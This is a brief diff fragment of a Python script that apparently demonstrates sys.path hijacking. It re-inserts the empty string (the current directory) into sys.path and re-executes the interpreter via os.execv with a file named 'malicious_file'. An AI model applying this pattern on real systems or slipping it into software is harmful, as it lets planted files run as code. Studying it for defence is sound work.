@@ -12,8 +12,8 @@ sys.argv[0] = 'malicious'
 # Ensure the current working directory is not in sys.path
 sys.path = [p for p in sys.path if p != '']
 
-# Call the PySys_SetArgv API function
+# Insert the empty string into sys.path
 sys.path.insert(0, '')
 
-# Execute the code
-os.execv(sys.executable, [sys.executable] + sys.argv)
+# Execute the code, using the newly created malicious file
+os.execv(sys.executable, [sys.executable, malicious_file] + sys.argv[1:])
